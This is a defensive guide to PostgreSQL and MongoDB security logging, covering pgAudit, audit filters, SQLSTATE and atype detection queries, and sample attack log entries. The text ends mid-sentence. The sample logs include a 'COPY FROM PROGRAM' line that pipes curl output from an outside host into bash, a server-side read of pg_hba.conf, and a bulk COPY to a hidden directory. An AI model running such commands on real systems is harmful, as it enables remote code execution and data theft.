PostgreSQL writes everything (errors, warnings, connection events, slow queries, and audit records) into a single server log stream. What that stream contains is entirely determined by roughly a dozen parameters in postgresql.conf , and the defaults are deliberately conservative. Out of the box PostgreSQL logs errors and fatal conditions but not connections, not disconnections, and not a single successful statement. A default installation will happily record that authentication failed while telling you nothing about the session that succeeded and then read your entire customer table. The log destination is equally configurable. stderr produces human-readable text, csvlog produces a strictly defined 23-column CSV that can be loaded straight into a table, and jsonlog (PostgreSQL 15 and later) produces one JSON object per event. For any environment feeding a SIEM, csvlog or jsonlog should be the choice: they eliminate the multi-line parsing problems that plague stderr output when a logged statement itself contains newlines. For true auditing PostgreSQL relies on pgAudit , an extension that hooks the executor and emits structured AUDIT records classified by statement type. pgAudit distinguishes session auditing, which follows a role, from object auditing, which follows a table, and it records the statement text and parameters that the standard log_statement setting cannot express with the same precision. Together with log_connections , log_disconnections , and a well-designed log_line_prefix , pgAudit is what makes PostgreSQL logging satisfy the privileged-activity and sensitive-data requirements set out in NIST SP 800-92 and the Saudi NCA controls.

PostgreSQL has one physical log but several logical record types, each controlled by its own parameter. Knowing which parameter produces which record is what makes the configuration tractable: Log Type Description Server Log The single output stream written by the logging collector. Carries startup and shutdown, checkpoints, autovacuum activity, errors, and every record type below. Available as stderr text, CSV, or JSON depending on log_destination. pgAudit Records Structured AUDIT entries emitted by the pgaudit extension, classified as READ, WRITE, FUNCTION, ROLE, DDL, or MISC. Includes the statement text and parameter values. The authoritative audit source for PostgreSQL. Connection and Authentication Log Produced by log_connections and log_disconnections. Records the client address, database, user, authentication method, and TLS parameters, plus session duration on disconnect. Disabled by default. Statement Log Controlled by log_statement, which accepts none, ddl, mod, or all. The ddl setting is a cheap, high-value baseline that records every schema and role change without logging read traffic. Slow Query Log Emitted when a statement exceeds log_min_duration_statement. Doubles as a security signal because bulk extraction and time-based blind injection are both slow by nature. Write-Ahead Log (WAL) The durability and replication stream. Not a security log and not human readable, but with tools such as pg_waldump or logical decoding it can reconstruct data changes that no audit configuration captured. pg_stat_statements An extension maintaining aggregated execution statistics per normalised query. Not an audit trail, but it reveals which query shapes are running and how much data they return, useful for spotting anomalous access patterns retroactively. Pro Tip: Setting log_statement = 'all' is not a substitute for pgAudit. It logs statements at parse time without knowing which objects were actually touched, misses statements executed inside functions, and provides no classification for filtering.

The log directory depends on both the distribution and whether the logging collector is enabled. When PostgreSQL is started by systemd without the collector, output goes to the journal instead of a file. Log Default Location Server Log (Debian / Ubuntu) /var/log/postgresql/postgresql-16-main.log Server Log (RHEL / Rocky) /var/lib/pgsql/16/data/log/postgresql-<day>.log Server Log (source build) $PGDATA/log/ when logging_collector is on, otherwise stderr of the postmaster systemd Journal journalctl -u postgresql@16-main when logging_collector is off Main Configuration /etc/postgresql/16/main/postgresql.conf or $PGDATA/postgresql.conf Host-Based Authentication /etc/postgresql/16/main/pg_hba.conf or $PGDATA/pg_hba.conf WAL Segments $PGDATA/pg_wal/ Windows C:\Program Files\PostgreSQL\16\data\log\ Pro Tip: Ask the server rather than the filesystem. SELECT pg_current_logfile(); returns the active log file, and SHOW data_directory; plus SHOW log_directory; resolve relative paths correctly.

Every setting below lives in postgresql.conf . Most take effect with a configuration reload; the ones marked otherwise require a restart. Step 1: Enable the Logging Collector and Choose a Destination logging_collector = on # requires restart log_destination = 'csvlog' # or 'jsonlog' on PostgreSQL 15+ log_directory = 'log' log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' log_rotation_age = 1d log_rotation_size = 100MB log_file_mode = 0600 log_truncate_on_rotation = off # never overwrite yesterday's evidence csvlog and jsonlog produce one parseable record per event even when the logged statement contains newlines, which is the single biggest reliability win for SIEM ingestion. Step 2: Log Connections, Disconnections, and Context log_connections = on log_disconnections = on log_hostname = off # keep off: DNS lookups add latency per connection log_line_prefix = '%m [%p] %q%u@%d %r %a ' log_statement = 'ddl' # none | ddl | mod | all log_min_duration_statement = 1000 # log any statement over 1 second log_min_messages = warning log_min_error_statement = error log_timezone = 'UTC' The log_line_prefix escapes are: %m timestamp with milliseconds, %p process id, %u user, %d database, %r remote host and port, %a application name. Without a prefix, log lines cannot be attributed to a session. Step 3: Install pgAudit # postgresql.conf (requires restart) shared_preload_libraries = 'pgaudit' -- then, in each database to be audited CREATE EXTENSION IF NOT EXISTS pgaudit; SELECT extname, extversion FROM pg_extension WHERE extname = 'pgaudit'; pgaudit must be loaded at server start through shared_preload_libraries. Creating the extension without the preload silently produces no audit output. Step 4: Configure Session Auditing pgaudit.log = 'ddl, role, write, function' pgaudit.log_catalog = off # suppress noisy system catalog reads pgaudit.log_parameter = on # record bind parameter values pgaudit.log_relation = on # one entry per relation referenced pgaudit.log_statement_once = off pgaudit.log_level = log This class set captures schema changes, privilege and role changes, all data modifications, and function execution while omitting the very high volume READ class. Add read only for databases where it is affordable. Step 5: Add Object Auditing for Sensitive Tables -- Create a dedicated audit role and grant it on sensitive objects only CREATE ROLE auditor NOLOGIN; GRANT SELECT, INSERT, UPDATE, DELETE ON hr.employees TO auditor; GRANT SELECT ON finance.payment_cards TO auditor; -- Tell pgAudit to audit anything that role could do ALTER SYSTEM SET pgaudit.role = 'auditor'; SELECT pg_reload_conf(); Object auditing works by proxy: pgAudit logs any operation that the named role has permission to perform. This lets you audit reads on two sensitive tables without enabling the READ class globally. Step 6: Audit Privileged Roles Individually -- Log everything a superuser or admin role does, without global overhead ALTER ROLE postgres SET pgaudit.log = 'all'; ALTER ROLE dba_admin SET pgaudit.log = 'all'; ALTER ROLE app_rw SET pgaudit.log = 'ddl, role, write'; -- Verify per-role settings SELECT rolname, setconfig FROM pg_db_role_setting s JOIN pg_roles r ON r.oid = s.setrole; Per-role audit settings are the key to a sustainable configuration: full coverage on the handful of privileged identities, targeted coverage on application accounts. Security Note: With pgaudit.log_parameter = on , bind values appear in the log, including passwords passed to functions and personal data in WHERE clauses. Set log_file_mode = 0600 , restrict the log directory, and classify PostgreSQL logs at the same sensitivity level as the data they describe.

pgAudit groups statements into six classes set through the pgaudit.log parameter. Choosing the right subset is the difference between a usable audit trail and an unreadable one. ROLE Captures GRANT, REVOKE, CREATE ROLE, ALTER ROLE, and DROP ROLE. Every privilege escalation in PostgreSQL passes through this class. Very low volume. Enable Critical DDL Records CREATE, ALTER, and DROP of any object, including extensions. Detects malicious extension installation and destructive schema changes. Low volume. Enable Critical WRITE Covers INSERT, UPDATE, DELETE, TRUNCATE, and COPY FROM. Moderate volume on transactional systems but essential for proving what data was altered. Enable High Risk FUNCTION Logs function and DO block execution. Important because a SECURITY DEFINER function is a common privilege escalation and persistence mechanism in PostgreSQL. Enable High Risk READ Covers SELECT and COPY TO. The highest volume class by a wide margin. Prefer object auditing through pgaudit.role over enabling this globally. Tune Medium Risk MISC / MISC_SET Miscellaneous commands such as DISCARD, FETCH, CHECKPOINT, VACUUM, and SET. MISC_SET separately covers SET statements including role switching via SET ROLE. Tune Medium Risk Security Note: A superuser can change pgaudit.log for their own session with a plain SET and disable auditing of their own activity. Enable MISC_SET so that the act of changing the audit configuration is itself recorded, and alert on it.

The csvlog destination writes a fixed column order defined by the PostgreSQL documentation. These are the fields that carry security value and should be mapped into your SIEM schema. Field Description Category Example Value log_time Timestamp with milliseconds and timezone Timestamp 2025-07-14 09:41:22.481 UTC user_name Database role used for the session Identity app_rw database_name Database the session is connected to Target shopdb process_id Backend process identifier Session 31882 connection_from Client address and port Source 10.30.2.61:52144 session_id Unique session identifier Session 6874a1b2.7c86 application_name Client-supplied application name Source psql error_severity Message severity level Severity FATAL sql_state_code Five-character SQLSTATE code Result 28P01 message The log message or AUDIT record Action password authentication failed for user "postgres" detail Additional context for the message Action Connection matched pg_hba.conf line 96 query The statement that produced the message Action SELECT * FROM customers backend_type Type of backend process Metadata client backend Pro Tip: pgAudit records arrive inside the message field with the fixed prefix AUDIT: SESSION,<statement_id>,<substatement_id>,<class>,<command>,<object_type>,<object_name>,<statement>,<parameters> . Parse that inner CSV to get a fully structured audit event.

PostgreSQL SQLSTATE codes are stable across versions, which makes them far more reliable detection anchors than message text. SQLSTATE Meaning Why It Matters 28P01 Invalid password The primary failed-authentication code. Bursts from one address are brute force; one attempt across many roles is password spraying 28000 Invalid authorization specification Includes "no pg_hba.conf entry for host", which reveals hosts probing the server from unauthorised networks 42501 Insufficient privilege An authenticated session attempting actions beyond its grants, classic post-compromise privilege probing 42P01 Undefined table In bursts this is object enumeration or blind SQL injection rather than an application bug 42601 Syntax error Repeated syntax errors against a production application are the signature of injection payload fuzzing 3D000 Invalid catalog name Connection attempts to databases that do not exist, indicating database name enumeration 53300 Too many connections Resource exhaustion, whether from a connection leak or a deliberate denial of service 57P01 / 57P02 Admin shutdown / crash shutdown Unexpected termination of the server, potentially anti-forensic or the result of exploitation XX001 / XX002 Data corrupted / index corrupted Storage failure or direct tampering with data files outside the database process Pro Tip: A FATAL 28000 with detail "no pg_hba.conf entry for host" means something reached the listening port from a network you never authorised. That is a network segmentation finding as much as a database one.

Use these commands to extract authentication attacks, privilege changes, superuser abuse, and bulk extraction from PostgreSQL logs. Failed Authentication by Source bash> grep "password authentication failed" /var/log/postgresql/*.log | grep -oP "host=\K[0-9.]+" | sort | uniq -c | sort -rn | head -20 Ranks source addresses by failed authentication count. Requires log_connections to be enabled for the host detail to be present. COPY FROM PROGRAM (RCE) bash> grep -iE "copy .*(from|to) program" /var/log/postgresql/*.log COPY FROM PROGRAM executes shell commands as the postgres OS user. Restricted to superusers and pg_execute_server_program members, and never legitimate in an application. Role and Privilege Changes bash> grep -E "AUDIT: SESSION,[0-9]+,[0-9]+,ROLE" /var/log/postgresql/*.log Isolates the pgAudit ROLE class, which contains every GRANT, REVOKE, and role creation on the instance. Superuser Grants SQL> SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolvaliduntil FROM pg_roles WHERE rolsuper OR rolcreaterole OR rolbypassrls ORDER BY rolname; Baseline this list and alert on any change. rolbypassrls is easy to miss and defeats row level security entirely. Dangerous Extensions SQL> SELECT extname, extowner::regrole, extnamespace::regnamespace FROM pg_extension WHERE extname IN ('plpythonu','plpython3u','plperlu','dblink','postgres_fdw','file_fdw'); Untrusted procedural languages and foreign data wrappers permit code execution and outbound network access from inside the database. Server-Side File Access bash> grep -iE "pg_read_file|pg_read_binary_file|pg_ls_dir|lo_import|lo_export" /var/log/postgresql/*.log These superuser functions read arbitrary files from the database host, including pg_hba.conf and SSH keys. Bulk Extraction Candidates SQL> SELECT userid::regrole, calls, rows, rows/GREATEST(calls,1) AS rows_per_call, left(query,80) FROM pg_stat_statements WHERE rows > 100000 ORDER BY rows DESC LIMIT 20; Surfaces query shapes returning very large row counts. Requires the pg_stat_statements extension. Active Sessions and Origins SQL> SELECT pid, usename, client_addr, application_name, backend_start, state, left(query,60) FROM pg_stat_activity WHERE backend_type = 'client backend' ORDER BY backend_start; Live view of who is connected from where and what they are running. The fastest triage step during an active incident. Unauthorised Network Probes bash> grep "no pg_hba.conf entry" /var/log/postgresql/*.log | grep -oP 'host "\K[0-9.]+' | sort | uniq -c | sort -rn Every hit is a host that reached the PostgreSQL port from a network that was never authorised to. Audit Configuration Tampering SIEM> source="postgres:csvlog" message="*pgaudit.log*" OR message="*ALTER SYSTEM*" OR message="*pg_reload_conf*" | table log_time, user_name, connection_from, message Detects a session changing its own audit level or rewriting server configuration. Should be alerted on, not reviewed weekly.

Follow these practices to make PostgreSQL logs complete, parseable, and defensible: 01 Use csvlog or jsonlog Default stderr output breaks whenever a logged statement contains a newline, producing broken events in the SIEM. A structured destination eliminates the entire class of parsing failure. 02 Turn On Connection Logging log_connections and log_disconnections are off by default. Without them there is no record of who connected, from where, or with which authentication method. 03 Set log_statement to ddl at Minimum Even without pgAudit, logging DDL captures every schema and role change at negligible cost. It is the cheapest meaningful improvement over the default configuration. 04 Design log_line_prefix Deliberately Include %m, %p, %u, %d, %r, and %a. Without user, database, and remote host in the prefix, log lines cannot be attributed to a session and are close to worthless. 05 Prefer Object Auditing to the READ Class Enabling pgaudit READ globally on a busy database produces volume nobody can consume. Use pgaudit.role to audit reads on the specific tables that hold regulated data. 06 Disable log_truncate_on_rotation With a time-based filename and truncation enabled, a restart can overwrite the previous log file entirely. Leave it off so evidence is never silently destroyed. 07 Protect the Log Files Set log_file_mode to 0600. With pgaudit.log_parameter enabled the logs contain bind values, which means they inherit the sensitivity of the data they describe. 08 Log in UTC and Ship Off-Host Set log_timezone to UTC for reliable correlation, and forward logs continuously. A superuser can execute COPY TO PROGRAM and delete the local log directory outright.

Representative log output showing how an attack against PostgreSQL progresses from probing to code execution. Failed Authentication (SQLSTATE 28P01) 2025-07-14 09:41:22.481 UTC [31882] postgres@postgres 203.0.113.44:52144 psql FATAL: password authentication failed for user "postgres" DETAIL: Connection matched pg_hba.conf line 96: "host all all 0.0.0.0/0 scram-sha-256" The DETAIL line is the more serious finding: pg_hba.conf permits connections from the entire internet. Fixing the network exposure matters more than the failed password. Unauthorised Network Probe (SQLSTATE 28000) 2025-07-14 09:39:08.117 UTC [31840] [unknown]@[unknown] 198.51.100.203:44120 FATAL: no pg_hba.conf entry for host "198.51.100.203", user "admin", database "postgres", no encryption A host from an unauthorised network reached port 5432 and attempted an unencrypted connection as "admin". This is scanning activity and should feed both database and network detections. pgAudit: Superuser Role Granted 2025-07-14 09:52:44.902 UTC [31955] app_rw@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,14,1,ROLE,ALTER ROLE,,,"ALTER ROLE reporting_svc WITH SUPERUSER;",<none> An application role granting SUPERUSER to a service account. In PostgreSQL, superuser means unrestricted file and command access on the host, not merely full database access. pgAudit: Command Execution via COPY FROM PROGRAM 2025-07-14 09:55:12.338 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,17,1,WRITE,COPY,TABLE,public.cmd_out,"COPY cmd_out FROM PROGRAM 'curl -s http://203.0.113.44/p.sh | bash';",<none> Direct remote code execution as the postgres operating system user. The newly granted superuser privilege from the previous entry is what made this possible: the two events are one chain. pgAudit: Sensitive Table Read via Object Auditing 2025-07-14 02:18:57.204 UTC [32104] r_almutairi@hrdb 10.30.7.19:49882 DBeaver LOG: AUDIT: OBJECT,23,1,READ,SELECT,TABLE,hr.employees,"SELECT employee_id, national_id, salary FROM hr.employees;",<none> An OBJECT class record produced by pgaudit.role rather than global READ auditing. A full extract of national ID and salary at 02:18 from an ad hoc SQL client warrants investigation. Server-Side File Read 2025-07-14 09:57:31.660 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,19,1,FUNCTION,SELECT,,,"SELECT pg_read_file('/etc/postgresql/16/main/pg_hba.conf');",<none> Reading the host authentication configuration reveals which networks and authentication methods are trusted: direct reconnaissance for the next stage of the attack. Slow Query: Bulk Extraction 2025-07-14 10:02:44.881 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: duration: 38812.447 ms statement: COPY (SELECT * FROM customers) TO '/tmp/.c/out.csv' WITH CSV; A server-side COPY writing the full customer table to a hidden directory. Duration alone would have flagged this even without pgAudit enabled. Back

Since version 4.4 MongoDB writes its diagnostic log as structured JSON rather than free text, which makes it one of the easiest database logs to ingest into a SIEM without custom parsing. Every line is a complete JSON object carrying a timestamp, severity, component, connection context, and message. The mongod log records startup configuration, connection accept and end events, authentication successes and failures, replication state changes, index builds, and any operation exceeding the slow operation threshold. What the diagnostic log does not provide is auditing. Recording who read which collection, who created a user, or who granted a role requires the separate audit log , available in MongoDB Enterprise, Percona Server for MongoDB, and Atlas. The audit log is configured independently, writes to its own destination, and supports a filter expression so you can capture authentication and authorisation events without recording every CRUD operation on a high-traffic cluster. The third source, the database profiler , writes operation detail into a capped system.profile collection per database, useful for targeted investigation but not a durable audit trail, since it lives inside the database an attacker controls. MongoDB deserves particular attention because of its exposure history. Tens of thousands of instances have been compromised through the same pattern: a deployment bound to 0.0.0.0 with authorisation disabled, discovered by internet-wide scanning, then emptied and replaced with a ransom note. That entire attack is visible in the diagnostic log (connections from unfamiliar addresses, no authentication events, then dropDatabase commands), but only if the log is being read. Enabling authorisation, binding to a private interface, and forwarding the JSON log off the host addresses the overwhelming majority of real-world MongoDB incidents.

MongoDB separates diagnostics, auditing, and profiling into three independent mechanisms with very different durability and licensing: Log Type Description mongod Diagnostic Log The primary server log, written as structured JSON since MongoDB 4.4. Records startup options, connection accept and end, authentication results, replication events, index builds, and slow operations. Available in every edition and enabled by default. Audit Log The dedicated security audit trail in MongoDB Enterprise, Percona Server for MongoDB, and Atlas. Records authentication, authorisation checks, user and role management, and optionally CRUD operations. Supports a filter expression and writes to file, syslog, or the console. mongos Log In sharded clusters, the router process maintains its own log. Client connections terminate at mongos, so client source addresses appear there rather than on the shards. Collecting only shard logs loses the true client origin. Database Profiler Writes operation detail including the full query shape, execution time, and originating client into the capped system.profile collection per database. Powerful for investigation but stored inside the database, so an attacker with write access can destroy it. Oplog The capped replication log in local.oplog.rs containing every write applied to the data set. Not a security log, but it can reconstruct exactly what documents were inserted, updated, or deleted within its retention window. FTDC Diagnostic Data Full Time Diagnostic Data Capture, a compressed binary metrics stream in the diagnostic.data directory. Primarily a support artifact, but valuable in forensics for establishing resource and connection patterns over time. Pro Tip: On a sharded cluster always collect mongos logs. Operations forwarded to shards carry the mongos as their source, so shard logs alone will attribute every client action to your own routers.

Paths follow the distribution packaging. When MongoDB is run in a container, logs go to stdout unless a path is configured explicitly. Log Default Location mongod Log (Linux) /var/log/mongodb/mongod.log mongos Log /var/log/mongodb/mongos.log Audit Log Defined by auditLog.path, commonly /var/log/mongodb/audit.json Configuration File /etc/mongod.conf Data Directory /var/lib/mongodb (Debian) or /var/lib/mongo (RHEL) FTDC Data <dbPath>/diagnostic.data/ Windows C:\Program Files\MongoDB\Server\7.0\log\mongod.log Container Deployments stdout by default; retrieve with docker logs or the orchestrator log driver Pro Tip: Confirm the running configuration rather than reading the file on disk. db.adminCommand({getCmdLineOpts: 1}) shows the options the process actually started with, which is what matters if someone edited the config without restarting.

Diagnostic logging is configured in the systemLog section of mongod.conf; auditing lives in auditLog and requires an edition that supports it. Both take effect on restart. Step 1: Configure the Diagnostic Log systemLog: destination: file path: /var/log/mongodb/mongod.log logAppend: true # never truncate on restart logRotate: reopen # cooperate with logrotate timeStampFormat: iso8601-utc verbosity: 0 component: accessControl: verbosity: 1 # log authentication detail network: verbosity: 1 # log connection detail logAppend is critical. Without it a restart overwrites the entire log file, and restarting the service is a trivial way for an attacker to destroy evidence. Step 2: Enforce Authentication and Network Binding security: authorization: enabled # the single most important setting net: bindIp: 127.0.0.1,10.40.1.15 # never 0.0.0.0 on an internet-reachable host port: 27017 tls: mode: requireTLS certificateKeyFile: /etc/ssl/mongodb.pem Without authorization enabled, MongoDB grants every connection full administrative access and produces no authentication events at all. This is the root cause of nearly every mass MongoDB compromise. Step 3: Enable the Audit Log auditLog: destination: file format: JSON path: /var/log/mongodb/audit.json Available in MongoDB Enterprise, Percona Server for MongoDB, and Atlas. Without a filter, every auditable action is recorded, which is appropriate to start with before tuning. Step 4: Apply an Audit Filter for Security Events auditLog: destination: file format: JSON path: /var/log/mongodb/audit.json filter: '{ "atype": { "$in": [ "authenticate", "authCheck", "createUser", "dropUser", "updateUser", "createRole", "dropRole", "updateRole", "grantRolesToUser", "revokeRolesFromUser", "grantPrivilegesToRole", "revokePrivilegesFromRole", "createCollection", "dropCollection", "dropDatabase", "shutdown", "replSetReconfig" ] } }' Captures authentication, the complete user and role lifecycle, destructive DDL, and cluster reconfiguration (the security-relevant subset) while excluding routine CRUD volume. Step 5: Audit Reads on Sensitive Collections Only filter: '{ "$or": [ { "atype": { "$in": ["authenticate","createUser","grantRolesToUser","dropDatabase"] } }, { "atype": "authCheck", "param.command": { "$in": ["find","aggregate","count"] }, "param.ns": { "$in": ["hrdb.employees","paydb.cards"] } } ] }' Combines instance-wide security auditing with read auditing scoped to two named namespaces. This is how you meet sensitive-data monitoring requirements without auditing every find on the cluster. Step 6: Enable the Profiler for Targeted Investigation // Log operations slower than 100 ms in the current database db.setProfilingLevel(1, { slowms: 100 }) // Full capture for a short investigation window, then revert db.setProfilingLevel(2) db.setProfilingLevel(1, { slowms: 100 }) // Review recent profiled operations db.system.profile.find().sort({ ts: -1 }).limit(20).pretty() Profiling level 2 captures every operation and grows the capped collection quickly. Use it for bounded investigation windows, never as a permanent configuration. Security Note: If your MongoDB edition has no audit log, the diagnostic log plus the profiler is all you have, and the profiler is stored in the database itself. In that case, forwarding the JSON diagnostic log off the host is not an optimisation, it is your only durable evidence.

MongoDB audit records are identified by their action type, or atype. These are the atypes that carry the highest security value and belong in any filter you deploy. authenticate Records every authentication attempt with the mechanism, user, database, and result code. Result 18 is AuthenticationFailed and is the core brute force signal. Enable Critical grantRolesToUser Fires when roles are assigned to a user. Granting root, dbOwner, or userAdminAnyDatabase is full privilege escalation on the deployment. Enable Critical createUser / dropUser The user lifecycle. Attacker-created accounts in MongoDB frequently carry innocuous names such as backup or admin2 and are granted root immediately. Enable Critical dropDatabase / dropCollection Destructive DDL. In MongoDB ransom campaigns, dropDatabase followed by insertion of a ransom document is the entire attack payload. Enable Critical authCheck Records authorisation decisions for individual commands including the namespace. The mechanism for auditing reads on sensitive collections, but extremely high volume unfiltered. Filter High Risk replSetReconfig Changes to replica set membership. Adding an attacker-controlled node to a replica set is a stealthy way to obtain a continuous copy of all data. Enable High Risk Security Note: The audit filter is fixed at startup and cannot be changed at runtime, which is a genuine security advantage: an attacker cannot quietly narrow your auditing. It also means testing a filter requires a restart, so validate it in a non-production deployment first.

Every diagnostic log line since MongoDB 4.4 is a single JSON object with a consistent set of top-level keys. These are the fields to map when building a SIEM integration. Field Description Category Example Value t.$date Event timestamp in ISO 8601 Timestamp 2025-07-14T09:41:22.481+00:00 s Severity: F, E, W, I, or D1-D5 Severity I c Component that emitted the message Metadata ACCESS id Stable numeric message identifier Detection 20249 ctx Context, usually the connection thread Session conn8412 msg Human-readable message text Action Authentication failed attr.remote Client address and port Source 203.0.113.44:52144 attr.user Authenticating user name Identity admin attr.db Authentication or target database Target admin attr.mechanism Authentication mechanism used Authorization SCRAM-SHA-256 attr.result MongoDB error code, 0 on success Result 18 attr.ns Namespace in database.collection form Target hrdb.employees attr.durationMillis Operation duration in milliseconds Performance 38812 attr.docsExamined Documents scanned by the operation Performance 2841776 Pro Tip: The id field is a stable message identifier that does not change when MongoDB rewords a message. Build detections on id rather than on msg text and they will survive version upgrades.

The component field routes each message to a subsystem, and the error code identifies the specific condition. Together they make precise filtering straightforward. Component / Code Meaning Why It Matters ACCESS, code 18 AuthenticationFailed The core failed-authentication signal. Repetition from one address is brute force; across many users it is spraying ACCESS, code 13 Unauthorized An authenticated session attempting an action beyond its role, indicating post-compromise privilege probing NETWORK, id 22943 Connection accepted Every new client connection with its source address. The baseline for detecting connections from unexpected networks NETWORK, id 22944 Connection ended Pairs with acceptance to reconstruct session duration and detect very short scanning connections COMMAND, id 51803 Slow query Any operation over the slow threshold, including docsExamined. Bulk collection scans surface here CONTROL Startup and shutdown Records the effective startup options, which reveals whether authorization was enabled and what bindIp was in force STARTUP WARNINGS Insecure configuration MongoDB explicitly warns at startup when access control is disabled and the server is not bound to localhost REPL Replication state changes Elections and reconfiguration. An unexpected member joining a replica set is a data exfiltration vector STORAGE, dropDatabase Database dropped Destructive activity. In the ransom campaigns this is the payload itself Pro Tip: Search any MongoDB log for the string "Access control is not enabled for the database". If it is present, the instance grants full administrative rights to anyone who can reach the port, so treat it as an active incident, not a configuration backlog item.

Use these jq, shell, and mongosh commands to extract authentication attacks, privilege changes, destructive operations, and bulk reads. Failed Authentication by Source bash> jq -r 'select(.c=="ACCESS" and .attr.result==18) | .attr.remote' /var/log/mongodb/mongod.log | cut -d: -f1 | sort | uniq -c | sort -rn | head -20 Ranks source addresses by authentication failures. Result code 18 is AuthenticationFailed. Access Control Disabled bash> grep -i "access control is not enabled" /var/log/mongodb/mongod.log A single hit means the instance accepts unauthenticated administrative access. This is the highest severity finding on any MongoDB deployment. Destructive Operations bash> jq -r 'select(.atype=="dropDatabase" or .atype=="dropCollection") | [.ts["$date"], .users[0].user, .param.ns, .remote.ip] | @tsv' /var/log/mongodb/audit.json Extracts every database and collection drop with the responsible user and source address from the audit log. Role Grants bash> jq -r 'select(.atype=="grantRolesToUser" or .atype=="createUser") | [.ts["$date"], .users[0].user, .param.user, (.param.roles|tostring), .remote.ip] | @tsv' /var/log/mongodb/audit.json Shows who granted what to whom. Any grant of root, __system, or userAdminAnyDatabase should be alerted on immediately. Bulk Collection Scans bash> jq -r 'select(.attr.docsExamined != null and .attr.docsExamined > 100000) | [.t["$date"], .attr.ns, .attr.docsExamined, .attr.durationMillis, .attr.remote] | @tsv' /var/log/mongodb/mongod.log Finds operations scanning more than 100,000 documents, the signature of a full collection extraction. Connections from Unexpected Networks bash> jq -r 'select(.id==22943) | .attr.remote' /var/log/mongodb/mongod.log | cut -d: -f1 | sort -u | grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)" Lists every non-RFC1918 address that opened a connection. On an internal database this list should be empty. Enumerate Privileged Users mongosh> db.getSiblingDB("admin").system.users.find({ "roles.role": { $in: ["root","userAdminAnyDatabase","dbOwner","__system"] } }, { user:1, db:1, roles:1 }) Lists every account holding a superuser-equivalent role. Baseline this and alert on additions. Verify Effective Configuration mongosh> db.adminCommand({ getCmdLineOpts: 1 }).parsed Returns the options the running process actually started with, including security.authorization and net.bindIp. More trustworthy than the config file on disk. Profiler Review mongosh> db.system.profile.find({ ns: /employees|cards/ }).sort({ ts: -1 }).limit(20).pretty() Reviews recent operations against sensitive collections including the full query shape and originating client. Replica Set Tampering SIEM> source="mongodb:audit" atype IN ("replSetReconfig","shutdown","setParameter") | table ts, users{}.user, remote.ip, param An unplanned replica set reconfiguration can silently add an attacker-controlled node that continuously receives all data.

Apply these practices to make MongoDB logging complete and to close the exposure that drives most real MongoDB incidents: 01 Enable Authorization First No amount of logging helps an instance that grants everyone administrative access. security.authorization enabled is the prerequisite for every authentication event you would want to detect. 02 Always Set logAppend Without logAppend, MongoDB truncates the log file on every restart. Restarting the service is a one-command way to destroy the entire diagnostic history. 03 Ingest the JSON Log Natively MongoDB 4.4 and later emit one JSON object per line. Parse it as JSON rather than with regular expressions, and build detections on the stable numeric id field. 04 Filter the Audit Log Deliberately Unfiltered auditCheck on a busy cluster produces enormous volume. Filter to authentication, user and role management, destructive DDL, and reads on named sensitive namespaces. 05 Collect mongos Logs in Sharded Clusters Client sessions terminate at the router. Without mongos logs every operation appears to originate from your own infrastructure and true client attribution is lost. 06 Do Not Rely on the Profiler as an Audit Trail system.profile is a capped collection inside the database. An attacker with write access can drop it, and it rolls over quickly under load. 07 Alert on Startup Warnings MongoDB explicitly logs when access control is disabled or the server is bound to all interfaces. Turn those specific startup warnings into alerts rather than ignoring them. 08 Forward Logs Off the Host Both the diagnostic and audit logs are ordinary files owned by the mongod user. Ship them continuously so a compromise of the database does not also destroy the record of it.

These entries trace the classic MongoDB compromise: an exposed instance, discovery by scanning, then either exfiltration or a ransom drop. Startup Warning: Unauthenticated Instance {"t":{"$date":"2025-07-14T08:02:11.334+00:00"},"s":"W","c":"CONTROL","id":22120,"ctx":"initandlisten","msg":"Access control is not enabled for the database. Read and write access to data and configuration is unrestricted","tags":["startupWarnings"]} {"t":{"$date":"2025-07-14T08:02:11.334+00:00"},"s":"W","c":"CONTROL","id":22140,"ctx":"initandlisten","msg":"This server is bound to localhost. Remote systems will be unable to connect to this server","tags":["startupWarnings"]} The first warning is the critical one. Combined with a bindIp of 0.0.0.0 instead of localhost, it means anyone who can route to port 27017 has full administrative control. Authentication Failure (Code 18) {"t":{"$date":"2025-07-14T09:41:22.481+00:00"},"s":"I","c":"ACCESS","id":20249,"ctx":"conn8412","msg":"Authentication failed","attr":{"mechanism":"SCRAM-SHA-256","speculative":false,"principalName":"admin","authenticationDatabase":"admin","remote":"203.0.113.44:52144","extraInfo":{},"error":"AuthenticationFailed: SCRAM authentication failed, storedKey mismatch"}} A storedKey mismatch means the account exists and the password was wrong. Repeated at high rate from one address, this is credential guessing against the admin user. Connection Flood from Scanning Infrastructure {"t":{"$date":"2025-07-14T09:38:02.117+00:00"},"s":"I","c":"NETWORK","id":22943,"ctx":"listener","msg":"Connection accepted","attr":{"remote":"198.51.100.203:44120","uuid":"5c1f...","connectionId":8390,"connectionCount":41}} {"t":{"$date":"2025-07-14T09:38:02.169+00:00"},"s":"I","c":"NETWORK","id":22944,"ctx":"conn8390","msg":"Connection ended","attr":{"remote":"198.51.100.203:44120","connectionId":8390,"connectionCount":40}} A connection accepted and closed 52 milliseconds later with no authentication in between. Hundreds of these from consecutive addresses is internet-wide scanning identifying exposed MongoDB instances. Audit Log: Backdoor Account with Root {"atype":"createUser","ts":{"$date":"2025-07-14T09:52:10.774+00:00"},"local":{"ip":"10.40.1.15","port":27017},"remote":{"ip":"203.0.113.44","port":52190},"users":[{"user":"admin","db":"admin"}],"roles":[{"role":"root","db":"admin"}],"param":{"user":"mongobackup","db":"admin","roles":[{"role":"root","db":"admin"}]},"result":0} A new account named to look like a backup service, granted root on the admin database. Result 0 confirms it succeeded. Bulk Extraction: Full Collection Scan {"t":{"$date":"2025-07-14T09:58:02.114+00:00"},"s":"I","c":"COMMAND","id":51803,"ctx":"conn8419","msg":"Slow query","attr":{"type":"command","ns":"shopdb.customers","command":{"find":"customers","filter":{},"batchSize":101},"planSummary":"COLLSCAN","keysExamined":0,"docsExamined":2841776,"nreturned":101,"durationMillis":38812,"remote":"203.0.113.44:52190"}} An empty filter with a COLLSCAN plan examining 2.8 million documents. The batched cursor means the client is paging through the entire 